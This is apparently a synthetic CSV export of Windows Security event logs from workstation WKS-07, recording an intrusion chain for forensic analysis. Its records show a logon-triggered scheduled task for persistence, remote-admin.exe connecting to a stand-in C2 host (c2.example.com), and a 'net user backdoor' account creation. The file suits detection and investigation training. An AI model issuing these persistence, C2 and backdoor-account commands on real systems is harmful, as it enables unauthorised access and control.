RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,Computer,UserId,Keywords,Opcode,UserName,SourceFile,MapDescription,ChunkNumber,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,ExecutableInfo,Payload
1,1001,2026-03-15 14:19:47.412,4688,Information,Microsoft-Windows-Security-Auditing,Security,WKS-07.corp.local,S-1-5-18,"AuditSuccess (0x8020000000000000)",Info,SYSTEM,security_sample.evtx,"A new process has been created.",0,"-","NewProcessName=C:\Windows\System32\rundll32.exe","NewProcessId=0x10b0","ParentProcessName=C:\Windows\explorer.exe","ProcessCommandLine=rundll32.exe ""C:\Windows\System32\shell32.dll"",Control_RunDLL","SubjectUserName=analyst","TokenElevationType=%%1937","SubjectUserSid=S-1-5-21-1581655573-1957994488-1801674531-1107|SubjectDomainName=CORP|MandatoryLabel=S-1-16-12288"
2,1002,2026-03-15 14:22:00.341,4624,Information,Microsoft-Windows-Security-Auditing,Security,WKS-07.corp.local,S-1-5-18,"AuditSuccess (0x8020000000000000)",Info,analyst,security_sample.evtx,"An account was successfully logged on.",0,"127.0.0.1","TargetUserName=analyst|TargetDomainName=CORP","LogonType=2","AuthenticationPackageName=Negotiate","WorkstationName=WKS-07","LogonGuid={00000000-0000-0000-0000-000000000000}","LogonProcessName=User32","SubjectUserSid=S-1-5-18|SubjectUserName=WKS-07$|SubjectDomainName=CORP|TargetUserSid=S-1-5-21-1581655573-1957994488-1801674531-1107|TargetLogonId=0x4f1289a|IpAddress=127.0.0.1|IpPort=0"
3,1003,2026-03-15 14:22:03.117,4698,Information,Microsoft-Windows-Security-Auditing,Security,WKS-07.corp.local,S-1-5-18,"AuditSuccess (0x8020000000000000)",Info,SYSTEM,security_sample.evtx,"A scheduled task was created.",0,"-","TaskName=\RemoteHandsSync","TaskContent=<Task><Triggers><LogonTrigger/></Triggers><Actions><Exec><Command>C:\Users\analyst\Downloads\remote-admin.exe</Command></Exec></Actions></Task>","SubjectUserName=SYSTEM","SubjectDomainName=NT AUTHORITY","ClientProcessId=0x10b0","ParentProcessId=0x10a4","SubjectUserSid=S-1-5-18"
4,1004,2026-03-15 14:23:11.704,4688,Information,Microsoft-Windows-Security-Auditing,Security,WKS-07.corp.local,S-1-5-21-1581655573-1957994488-1801674531-1107,"AuditSuccess (0x8020000000000000)",Info,analyst,security_sample.evtx,"A new process has been created.",0,"-","NewProcessName=C:\Users\analyst\Downloads\remote-admin.exe","NewProcessId=0x12fc","ParentProcessName=C:\Windows\System32\taskeng.exe","ProcessCommandLine=remote-admin.exe --connect c2.example.com","SubjectUserName=analyst","TokenElevationType=%%1937","SubjectUserSid=S-1-5-21-1581655573-1957994488-1801674531-1107|SubjectDomainName=CORP|ParentProcessId=0x10b0|MandatoryLabel=S-1-16-12288"
5,1005,2026-03-15 14:35:02.118,4688,Information,Microsoft-Windows-Security-Auditing,Security,WKS-07.corp.local,S-1-5-21-1581655573-1957994488-1801674531-1107,"AuditSuccess (0x8020000000000000)",Info,analyst,security_sample.evtx,"A new process has been created.",0,"-","NewProcessName=C:\Windows\System32\net.exe","NewProcessId=0x14e0","ParentProcessName=C:\Users\analyst\Downloads\remote-admin.exe","ProcessCommandLine=net user backdoor P@ssw0rd! /add","SubjectUserName=analyst","TokenElevationType=%%1937","SubjectUserSid=S-1-5-21-1581655573-1957994488-1801674531-1107|SubjectDomainName=CORP|ParentProcessId=0x12fc|MandatoryLabel=S-1-16-12288"
6,1006,2026-03-15 09:01:00.018,4663,Information,Microsoft-Windows-Security-Auditing,Security,WKS-07.corp.local,S-1-5-21-1581655573-1957994488-1801674531-1107,"AuditSuccess (0x8020000000000000)",Info,analyst,security_sample.evtx,"An attempt was made to access an object.",0,"-","ObjectName=C:\Users\analyst\Documents\quarterly-report.docx","ObjectType=File","AccessMask=0x1","ProcessName=WINWORD.EXE","SubjectUserName=analyst","HandleId=0x4a8","SubjectUserSid=S-1-5-21-1581655573-1957994488-1801674531-1107|SubjectDomainName=CORP|ProcessId=0x18f4|ResourceAttributes=S:AI"
